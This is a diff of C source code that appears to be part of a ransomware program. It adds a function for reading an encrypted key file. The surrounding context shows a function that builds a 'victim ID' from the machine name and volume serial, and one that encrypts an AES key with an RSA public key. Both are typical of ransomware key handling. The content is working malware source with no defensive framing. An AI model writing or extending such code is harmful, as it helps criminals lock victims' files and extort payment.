@@ -69,7 +69,6 @@ static void random_bytes(unsigned char *buf, size_t len) {
 }
 
 /* Generate victim ID using computer name and volume serial number */
-
 static int generate_victim_id(char *victim_id, size_t id_size) {
     char comp_name[256];
     DWORD name_len = sizeof(comp_name);
@@ -98,6 +97,58 @@ static int generate_victim_id(char *victim_id, size_t id_size) {
     
     return 0;
 }
+
+/* Read the encrypted key file */
+static int read_encrypted_key_file(const char *key_file, 
+                                    unsigned char **key_data, 
+                                    size_t *key_size) {
+    FILE *file;
+    long file_size = 0;
+    unsigned char *file_data;
+    
+    if (!key_file || !key_data || !key_size) {
+        fprintf(stderr, "Invalid parameters\n");
+        return -1;
+    }
+    
+    // open file
+    file = fopen(key_file, "rb");
+    if (!file) {
+        fprintf(stderr, "Failed to open file\n");
+        return -1;
+    }
+    
+    // get file size
+    fseek(file, 0, SEEK_END);
+    file_size = ftell(file);
+    
+    if (file_size == 0) {
+        fclose(file);
+        fprintf(stderr, "File is empty\n");
+        return -1;
+    }
+    
+    // allocate memory
+    file_data = malloc(file_size);
+    
+    // read file
+    fseek(file, 0, SEEK_SET); // go back to beginning as previously the pointer was moved
+    if (fread(file_data, 1, file_size, file) != file_size) {
+        free(file_data);
+        fclose(file);
+        fprintf(stderr, "Failed to read file\n");
+        return -1;
+    }
+    
+    fclose(file);
+    
+    // return key and its size
+    *key_data = file_data;
+    *key_size = file_size;
+    
+    return 0;
+}
+
 /* Encrypt AES key with public RSA key */
 static void save_encrypted_key_rsa(const unsigned char *key, size_t key_len, const char *pubkey_file, const char *out_file) {
     mbedtls_pk_context pk;
